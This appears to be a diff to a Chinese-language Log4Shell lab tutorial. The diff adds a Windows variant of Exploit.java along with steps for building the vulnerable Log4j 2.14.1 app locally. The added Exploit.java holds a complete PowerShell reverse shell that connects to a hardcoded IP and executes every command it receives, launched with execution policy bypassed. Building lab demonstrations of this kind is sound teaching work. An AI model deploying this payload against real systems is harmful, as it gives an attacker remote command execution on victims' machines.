@@ -126,6 +126,50 @@ public class Exploit {
 }
 ```
 
+上面的 `Exploit.java` 使用 bash 的原因是因為我們的受害者電腦是在 docker 環境下，因此我們選擇使用 bash，如果我們的目標電腦是 windows 的話，我們可以改為使用 powershell :
+
+```java title="Exploit.java" showLineNumbers {6-7}
+import java.io.IOException;
+
+public class Exploit {
+    static {
+        try {
+            String host = "104.199.254.153";
+            int port = 8000;
+            String payload = String.format(
+                "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +
+                "$stream = $client.GetStream();" +
+                "$writer = New-Object System.IO.StreamWriter($stream);" +
+                "$reader = New-Object System.IO.StreamReader($stream);" +
+                "$writer.AutoFlush = $true;" +
+                "while($true) {" +
+                    "$command = $reader.ReadLine();" +
+                    "if ($command -eq 'exit') { break }" +
+                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }" +
+                    "$writer.WriteLine($output)" +
+                "}" +
+                "$client.Close()",
+                host, port
+            );
+
+            String[] command = {
+                "powershell.exe",
+                "-NoProfile",
+                "-ExecutionPolicy", "Bypass",
+                "-Command", payload
+            };
+
+            ProcessBuilder pb = new ProcessBuilder(command);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            System.out.println("PowerShell reverse shell command executed.");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
 重要的是，受限於 log4j 的版本，我們需要使用舊版的 java 來進行編譯，指令如下 :
 
 ```bash
@@ -295,8 +339,6 @@ EXPOSE 8080
 CMD ["java", "-cp", ".:/app/log4j-core-2.14.1.jar:/app/log4j-api-2.14.1.jar", "VulnerableApp"]
 ```
 
-接著執行指令來建立 docker image :
-
 ```bash
 docker build -t vulnerable-app .
 
@@ -311,6 +353,22 @@ apk add --no-cache bash
 ```
 
 接著輸入 `which bash` 來確認是否安裝成功。
+
+如果我們不想使用 docker 來建立環境，我們也可以直接在本地端依據以下步驟來建立環境 :
+
+1. 首先到 [這個網站](https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=436&field_architecture_target_id=391&field_java_package_target_id=396) 安裝 java-8
+2. 接著安裝 [log4j-core-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar) 和 [log4j-api-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar)
+3. 在 powershell 中執行以下指令
+
+```pwsh
+javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp.java
+```
+
+```pwsh
+java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp
+```
+
+要注意在 windows 中沒有 bash，因此在 `Exploit.java` 中的指令要改為 powershell。
 
 ## 測試
 
